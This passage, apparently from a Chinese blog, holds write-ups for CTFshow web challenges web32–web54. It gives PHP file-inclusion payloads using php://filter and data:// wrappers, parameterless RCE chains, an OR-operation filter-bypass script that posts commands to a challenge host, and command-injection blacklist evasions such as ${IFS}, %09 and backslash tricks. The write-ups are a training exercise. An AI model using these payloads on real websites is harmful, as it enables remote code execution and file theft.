+<p>include（） 包含并运行指定文件。用法：                                                                        <?php include 'filename'; ?></p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/2022/03/08/CTFshow/image-20220123195829460.png" alt="image-20220123195829460"></p>
+<p>又过滤了. 单引号，反引号，echo，分号，括号</p>
+<p><img src="/2022/03/08/CTFshow/image-20220123200137401.png" alt="image-20220123200137401"></p>
+<p>直接使用include构造payload：                                                                                                      </p>
+<p> ?c=include$_GET[“a”]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>或者：?c=include$_POST[“a”]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>再base64解码即可。</p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/2022/03/08/CTFshow/image-20220123215344010.png" alt="image-20220123215344010"></p>
+<p>多过滤了双引号</p>
+<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/2022/03/08/CTFshow/image-20220123220748630.png" alt="image-20220123220748630"></p>
+<p>多过滤了冒号</p>
+<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php            同上</p>
+<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="/2022/03/08/CTFshow/image-20220123223117291.png" alt="image-20220123223117291"></p>
+<p>多了小于，等于，payload 同上</p>
+<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/2022/03/08/CTFshow/image-20220123224059837.png" alt="image-20220123224059837"></p>
+<p>多了/  [0-9]</p>
+<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php       同上</p>
+<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p><img src="/2022/03/08/CTFshow/image-20220123224414358.png" alt="image-20220123224414358"></p>
+<p>过滤了flag，然后又是文件包含，运用伪协议读</p>
+<p>php://filter 无法使用，原因：过滤了flag，无法读取flag.php</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:<span class="regexp">//</span>流会被当作php文件执行</span><br></pre></td></tr></table></figure>
+
+<p>用法：<img src="/2022/03/08/CTFshow/image-20220123225716037.png" alt="image-20220123225716037"></p>
+<p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
+<p>此题无法使用input</p>
+<p><strong>【data://协议】写入协议</strong></p>
+<p>PHP.ini：</p>
+<p>data://协议必须双在on才能正常使用；</p>
+<p>allow_url_fopen ：on</p>
+<p>allow_url_include：on</p>
+<p>参考自：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.data.php">http://php.net/manual/zh/wrappers.data.php</a>, 官方文档上allow_url_fopen应为yes。</p>
+<p>用法：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,php程序代码</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.data:<span class="comment">//text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="meta">.data</span>:<span class="comment">//text/plain;base64,    </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat fla*&quot;); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以不要?&gt;</p>
+<p>然后查看网页源代码即可。</p>
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="/2022/03/08/CTFshow/image-20220124121243869.png" alt="image-20220124121243869"></p>
+<p>由于多过滤掉php,所以采用data://text/plain;base64,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=   是<span class="meta">&lt;?php</span> system(<span class="string">&quot;cat flag.php&quot;</span>); <span class="meta">?&gt;</span>  的base64编码，可以不要<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看网页源代码即可</p>
+<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="/2022/03/08/CTFshow/image-20220124131602848.png" alt="image-20220124131602848"></p>
+<p>有.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat fla*&quot;); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>此题必须要?&gt;</p>
+<p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p>
+<p><img src="/2022/03/08/CTFshow/image-20220124131948470.png" alt="image-20220124131948470"></p>
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p><img src="/2022/03/08/CTFshow/image-20220124132915367.png" alt="image-20220124132915367"></p>
+<p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取</p>
+<p>一般括号里参数都要用引号，这里学习一下无参数RCE</p>
+<p><strong>无参数</strong>的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong></p>
+<p><strong>print_r(scandir(‘.’))</strong></p>
+<p>可以用来查看当前目录所有文件名</p>
+<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
+<p>​         <strong>scandir() 函数返回指定目录中的文件和目录的数组</strong></p>
+<ul>
+<li>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</li>
+<li>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</li>
+<li>pos() 同 current()  ,是current()的别名</li>
+<li>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
+<li>array_reverse()逆转数组函数</li>
+<li>next()函数进行下一个值的读取</li>
+<li>ord()返回字符串中第一个字符的Ascii值</li>
+<li><img src="/2022/03/08/CTFshow/image-20220124140605804.png" alt="image-20220124140605804"></li>
+<li>readgzfile()也可读文件，常用于绕过过滤</li>
+<li>dirname() ：返回路径中的目录部分</li>
+<li>chdir() ：改变当前工作目录</li>
+<li>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</li>
+<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
+<li>show_source() 函数对文件进行语法高亮显示。</li>
+<li>highlight_file() 函数对文件进行语法高亮显示。</li>
+<li>readfile() 函数读取一个文件，并写入到输出缓冲。</li>
+</ul>
+<p>​         **localeconv() ** 函数 返回数组的第一项就是 .  (小数点)<img src="/2022/03/08/CTFshow/image-20220124144510476.png" alt="image-20220124144510476"></p>
+<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
+<p>所以最终我们可以构造如下：查看当前目录所有文件名</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">dirname</span>(<span class="params">getcwd</span>()</span>))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>
+
+<p>此题，我们先查看当前目录所有文件名</p>
+<p><img src="/2022/03/08/CTFshow/image-20220124141445757.png" alt="image-20220124141445757"></p>
+<p>payload:?c=show_source(next(array_reverse(scandir(current(localeconv())))));    </p>
+<p>或者  ?c=readfile(next(array_reverse(scandir(current(localeconv()))))); 查看源代码</p>
+<p><img src="/2022/03/08/CTFshow/image-20220124141844065.png" alt="image-20220124141844065"></p>
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p><img src="/2022/03/08/CTFshow/image-20220124230027276.png" alt="image-20220124230027276"></p>
+<p>过滤了<strong>所有数字，所有字母，异或符号，加号符号，`符号，$符号，【符号，】符号，大括号（左），大括号（右），&amp;符号，-符号</strong></p>
+<p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用</p>
+<p>可以通过“或”运算来获得相应的字符，组成命令 或：|   脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>dechex()把十进制转为十六进制  </p>
+<p>得到了rce_or.txt <img src="/2022/03/08/CTFshow/image-20220127211944518.png" alt="image-20220127211944518"></p>
+<p>文件内容或运算后，url解码就是需要的字母     python脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&quot;http://df47b3bc-3ef6-4727-b8c9-a6f8578f8944.challenge.ctf.show/&quot;</span></span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="/2022/03/08/CTFshow/image-20220127212157187.png" alt="image-20220127212157187"></p>
+<p><img src="/2022/03/08/CTFshow/image-20220127212204564.png" alt="image-20220127212204564"></p>
+<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><img src="/2022/03/08/CTFshow/image-20220127221626111.png" alt="image-20220127221626111"></p>
+<p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p>
+<p><strong>1、可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
+<p><strong>2、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
+<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
+<p><strong>那么:</strong><br>1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 </p>
+<p>3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 </p>
+<p>下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。<br>dd if=/dev/zero of=file count=10 bs=1024</p>
+<p> shell中可能经常能看到：<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">&gt;/dev/null 2&gt;&amp;1</a> </p>
+<p>命令的结果可以通过%&gt;的形式来定义输出</p>
+<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。</p>
+<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”</p>
+<p><strong>因此，&gt;<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">/dev/null 2&gt;&amp;1</a> 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
+<p>要让命令回显，那么进行命令分隔即可</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>
+
+<p>payload : ?c=cat flag.php;    ?c=cat flag.php||</p>
+<p>再查看源代码</p>
+<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p><img src="/2022/03/08/CTFshow/image-20220127223234161.png" alt="image-20220127223234161"></p>
+<p>过滤了分号和cat</p>
+<p>payload:?c=tac flag.php||</p>
+<p>补充：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看，uniq用于重复数据处理,使用前先sort排序。</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep 用于查找文件里符合条件的字符串。</span><br><span class="line">strings</span><br><span class="line">paste 可以查看文件，从指定的文件中读取输入，从一个或多个文件中连接行</span><br></pre></td></tr></table></figure>
+
+<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="/2022/03/08/CTFshow/image-20220127223555173.png" alt="image-20220127223555173"></p>
+<p>payload:?c=tac fla*.php||</p>
+<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p><img src="/2022/03/08/CTFshow/image-20220127223755217.png" alt="image-20220127223755217"></p>
+<p>多过滤了空格</p>
+<p><strong>空格绕过</strong></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%<span class="number">09</span>`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$<span class="number">9</span>`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%<span class="number">20</span>`</span><br><span class="line">`%<span class="number">09</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：?c=tac%09fla*.php||</p>
+<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p><img src="/2022/03/08/CTFshow/image-20220127224459611.png" alt="image-20220127224459611"></p>
+<p>多过滤了数字，$，*等</p>
+<p>*可以用？代替，空格可用%09  ，因为%09是编码，浏览器对他自动解码为一个水平制表符，而不是为数字</p>
+<p>payload:?c=tac%09fla?.php||</p>
+<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p><img src="/2022/03/08/CTFshow/image-20220127225946719.png" alt="image-20220127225946719"></p>
+<p>payload: ?c=tac%09fla?.php||</p>
+<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="/2022/03/08/CTFshow/image-20220127230657232.png" alt="image-20220127230657232"></p>
+<p>payload: ?c=tac%09fla?.php||</p>
+<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="/2022/03/08/CTFshow/image-20220128211059961.png" alt="image-20220128211059961"></p>
+<p>payload: ?c=tac%09fla?.php||</p>
+<p>因为%09是编码，浏览器对他自动解码为一个水平制表符，而不是为数字，也不是%</p>
+<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="/2022/03/08/CTFshow/image-20220128215058673.png" alt="image-20220128215058673"></p>
+<p>%09 %26被过滤了 使用重定向符&lt;&gt;代替空格，，但是&lt;&gt;后面不能跟有通配符，&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替,我们通过反斜杠<code>\</code>来绕过过滤的flag<img src="/2022/03/08/CTFshow/image-20220128220043797.png" alt="image-20220128220043797"></p>
+<p>payload:?c=tac&lt;&gt;fla\g.php||</p>
+<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="/2022/03/08/CTFshow/image-20220128220619948.png" alt="image-20220128220619948"></p>
+<p>tac也被过滤了</p>
+<p>使用反斜杠<code>\</code>绕过,或者利用<code>nl</code>替代<code>tac</code>，nl 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。 </p>
+<p>payload：?c=ta\c&lt;&gt;fla\g.php||   或者 ?c=nl&lt;&gt;fla\g.php|| 查看网页源代码</p>
+<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="/2022/03/08/CTFshow/image-20220128221324732.png" alt="image-20220128221324732"></p>
+<p>也过滤了重定向符，没过滤$</p>
+<p>?c=ta\c${IFS}fla\g.php||   或  ?c=nl${IFS}fla\g.php||</p>
+<p><img src="/2022/03/08/CTFshow/image-20220128221645044.png" alt="image-20220128221645044"></p>
+<p>但是是假的</p>
+<p>看下根目录文件   ?c=ls${IFS}/||   <img src="/2022/03/08/CTFshow/image-20220128221925099.png" alt="image-20220128221925099"></p>
+<p>读取即可   ?c=nl${IFS}/fla\g||    ?c=ca\t${IFS}/fla\g||</p>
+<p>  <img src="/2022/03/08/CTFshow/image-20220128222111942.png" alt="image-20220128222111942"></p>
+<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="/2022/03/08/CTFshow/image-20220129115224616.png" alt="image-20220129115224616"></p>
+<p>payload : ?c=ca\t${IFS}fla\g.php</p>
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p><img src="/2022/03/08/CTFshow/image-20220129115722029.png" alt="image-20220129115722029"></p>
+<p>?c=ls${IFS} 得到</p>
+<p><img src="/2022/03/08/CTFshow/image-20220129120340261.png" alt="image-20220129120340261"></p>
+<p>过滤了;|cat|flag|空格|数字|查看文件命令nl等|`|%|\x09(空格)|\x26(&amp;)|&lt;|&gt;</p>
+<p>payload :  ?c=paste${IFS}fla?.php</p>
+<p>?c=grep${IFS}%27</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/08/XSS/" rel="prev" title="XSS">
+                  <i class="fa fa-chevron-left"></i> XSS
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/10/CTFshow-3/" rel="next" title="CTFshow-3">
+                  CTFshow-3 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
